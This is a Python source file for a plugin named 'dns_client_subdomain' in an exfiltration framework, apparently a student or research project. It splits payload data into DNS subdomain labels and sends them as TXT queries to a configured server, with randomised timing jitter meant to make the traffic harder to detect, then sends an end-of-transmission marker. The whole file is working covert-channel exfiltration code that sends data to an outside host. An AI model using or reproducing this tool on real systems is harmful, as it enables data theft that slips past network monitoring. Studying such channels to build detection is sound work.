from __future__ import annotations
from typing import Dict, Any, Iterable
from dnslib import DNSRecord, QTYPE
import socket, time, random
from tfg.plugins.api import ExfilClientPlugin
from .dns_common import chunk_labels

class DnsClientSubdomain(ExfilClientPlugin):
    canal = "DNS"
    metodo = 1
    name = "dns_client_subdomain"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        server = config["host"]; port = int(config.get("port", 53))
        root = config["root_domain"].strip("."); exfil_id = config.get("exfil_id") or "tfg"
        ritmo_base = int(config.get("ritmo_base_ms") or 0)
        ritmo_disp = int(config.get("ritmo_dispersion_ms") or 0)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); sent = 0
        try:
            for label in chunk_labels(payload_iter):
                if ritmo_base or ritmo_disp:
                    time.sleep(max(0.0, (ritmo_base + random.uniform(-ritmo_disp, ritmo_disp)) / 1000.0))
                qname = f"{label}.{exfil_id}.{root}."
                q = DNSRecord.question(qname, qtype="TXT")
                sock.sendto(q.pack(), (server, port)); sent += 1
            q = DNSRecord.question(f"EOT.{exfil_id}.{root}.", qtype="TXT")
            sock.sendto(q.pack(), (server, port)); sent += 1
            return {"ok": True, "queries": sent}
        finally:
            sock.close()
